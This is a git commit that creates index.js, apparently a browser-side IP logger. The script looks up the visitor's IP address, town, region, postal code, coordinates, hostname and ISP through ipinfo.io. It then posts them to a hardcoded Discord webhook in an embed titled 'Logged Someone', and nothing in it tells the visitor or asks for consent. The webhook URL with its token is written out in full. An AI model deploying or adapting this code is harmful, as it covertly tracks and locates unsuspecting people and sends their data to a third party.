b6cae4ba49ce7e382df3de5ec2bca7802f679895
zylenox <99050671+zyIenox@users.noreply.github.com>
2023-01-26 20:47:04 -0600

    Create index.js

---
+++ index.js
@@ -0,0 +1,35 @@
+$.getJSON("https://ipinfo.io/json", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Logged Someone",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "IP Address",
+            "value": `> ${data.ip}`
+          },
+          {
+            "name": "GeoLocation Info",
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+          },
+          {
+            "name": "Network Info",
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discord.com/api/webhooks/1068360062902481048/I4dOOdheiLlGqJZW9rHHK_-Spv5ErrTMieZUdNkBp0CEJf9q2mIXB4UtGwLWUMT5g09i', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+    console.log(res);
+  }) 
+})
